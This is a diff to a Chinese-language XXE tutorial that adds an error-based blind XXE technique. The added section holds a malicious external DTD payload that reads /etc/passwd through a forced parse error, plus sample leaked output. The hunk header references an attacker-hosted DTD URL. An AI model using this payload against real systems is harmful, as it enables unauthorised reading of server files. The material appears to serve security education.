@@ -169,6 +169,22 @@ http://web-attacker.com/malicious.dtd
 此技术可能不适用于某些文件内容，包括 /etc/passwd 文件中包含的换行符。这是因为某些 XML 解析器使用 API 在外部实体定义中获取 URL，该 API 会验证允许出现在 URL 中的字符。在这种情况下，可以使用 FTP 协议而不是 HTTP。有时，无法泄露包含换行符的数据，因此可以改为将 /etc/hostname 等文件作为目标
 # xxe报错从而获取数据
 利用盲 XXE 的另一种方法是触发 XML 解析错误，其中错误消息包含您希望检索的敏感数据。如果应用程序在其响应中返回生成的错误消息，这将有效。
+您可以使用恶意的外部 DTD 触发包含 /etc/passwd 文件内容的 XML 解析错误消息，如下所示：
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+得到
+```
+java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+```
+
+
+
 # 文件上传打xxe
 某些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式示例包括 DOCX 等办公文档格式和 SVG 等图像格式。
 例如，应用程序可能允许用户上传图像，并在上传图像后在服务器上处理或验证这些图像。即使应用程序希望接收 PNG 或 JPEG 等格式，正在使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而到达 XXE 漏洞的隐藏攻击面。
